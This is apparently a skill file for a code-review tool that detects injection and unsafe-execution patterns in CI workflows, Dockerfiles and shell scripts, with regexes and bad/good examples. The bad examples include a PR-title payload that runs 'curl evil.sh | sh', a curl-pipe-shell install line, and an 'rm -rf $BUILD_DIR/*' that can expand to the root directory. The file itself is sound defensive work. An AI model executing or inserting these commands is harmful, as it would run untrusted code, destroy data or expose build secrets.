---
name: generic-injection
description: Detect injection and unsafe-execution vectors in non-Python files — shell expansion in CI, Dockerfile RUN with variables, curl-pipe-shell, and privilege misconfiguration. Use when reviewing YAML, Dockerfiles, shell scripts, and CI configs.
---

# Generic injection vectors

Config and CI files execute code. Anything that reaches a shell with an
attacker-influenced value is an injection vector, and in CI the attacker is
often anyone who can open a pull request.

## How to judge severity

- `critical` — untrusted input reaches a shell in a privileged context
  (`pull_request_target`, a release job, a deploy step).
- `high` — untrusted input reaches a shell anywhere else.
- `medium` — unsafe execution of trusted-but-remote content, or a privilege
  setting that widens the blast radius of another bug.

## Patterns

### 1. GitHub Actions expression interpolated into a run block — critical
```regex
\$\{\{\s*(github\.event\.[\w.]+|github\.head_ref|inputs\.[\w.]+)\s*\}\}
```
```yaml
# bad — a PR title of `"; curl evil.sh | sh; #` runs as the workflow
- run: echo "Reviewing ${{ github.event.pull_request.title }}"

# good — pass through the environment, where it stays a value
- run: echo "Reviewing $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```
`${{ }}` is substituted into the script *before* the shell runs, so quoting in
the YAML does not help. This is the single highest-value pattern in this skill.
Escalate to `critical` when the trigger is `pull_request_target`, which grants
a write-scoped token to code from a fork.

### 2. Unquoted variable expansion in shell — high
```regex
\$\{?[A-Za-z_][A-Za-z0-9_]*\}?(?![\w"'])
```
Report when the expansion is an argument to a command and is not quoted.
```bash
# bad — word splitting and glob expansion apply
rm -rf $BUILD_DIR/*

# good
rm -rf "${BUILD_DIR:?BUILD_DIR is required}"/*
```
An unset `BUILD_DIR` turns the bad form into `rm -rf /*`.

### 3. Dockerfile RUN with an unquoted build argument — high
```regex
(?i)^\s*RUN\s+.*\$\{?[A-Za-z_][A-Za-z0-9_]*
```
```dockerfile
# bad
ARG REPO_URL
RUN git clone $REPO_URL /src && ./src/setup.sh

# good
ARG REPO_URL
RUN git clone "${REPO_URL:?}" /src
```

### 4. Piping a downloaded script into a shell — high
```regex
(?i)(curl|wget)\s+[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh
```
```dockerfile
# bad — unpinned, unverified, executed as root
RUN curl -sL https://example.com/install.sh | sh

# good — pin, verify, then run
RUN curl -fsSL https://example.com/install-v1.4.2.sh -o /tmp/install.sh \
 && echo "9f2a...  /tmp/install.sh" | sha256sum -c - \
 && sh /tmp/install.sh && rm /tmp/install.sh
```
A compromised or MITM'd host executes arbitrary code in your build.

### 5. eval on a variable — critical
```regex
(?i)\beval\s+["']?\$
```
```bash
# bad
eval "$USER_COMMAND"

# good — dispatch through an explicit allowlist
case "$USER_COMMAND" in
  build)  ./build.sh ;;
  test)   ./test.sh ;;
  *)      echo "unknown command" >&2; exit 1 ;;
esac
```

### 6. Container running as root — medium
```regex
(?i)^\s*USER\s+root|(?i)runAsUser:\s*0|(?i)privileged:\s*true
```
A Dockerfile with no `USER` instruction also runs as root. Add a non-root user
so a container escape does not start with full privileges.
```dockerfile
RUN adduser --system --no-create-home --uid 10001 app
USER app
```

### 7. Unpinned mutable base image or action — medium
```regex
(?i)^\s*FROM\s+\S+:latest|uses:\s*\S+@(main|master|v\d+)\s*$
```
```yaml
# bad — the tag can be re-pointed under you
- uses: some-org/some-action@v3

# good — pin to an immutable commit SHA
- uses: some-org/some-action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
```

### 8. Overly broad workflow permissions — medium
```regex
(?i)permissions:\s*write-all|contents:\s*write
```
Grant the least privilege the job needs. Combined with pattern 1, a
write-scoped token turns a shell injection into repository compromise.

### 9. Secret echoed or written to a log — high
```regex
(?i)(echo|print|cat)\s+.*\$\{?\w*(SECRET|TOKEN|PASSWORD|KEY)
```
CI logs are frequently world-readable, and masking only covers values the
runner already knows are secrets — a derived or decoded value is printed in
the clear.

### 10. Disabled TLS verification — high
```regex
(?i)(curl\s+.*(-k|--insecure)|wget\s+.*--no-check-certificate|verify\s*[:=]\s*false|GIT_SSL_NO_VERIFY)
```
Disabling certificate verification makes the transfer trivially
man-in-the-middleable. If an internal CA is the problem, install the CA
certificate rather than turning verification off.
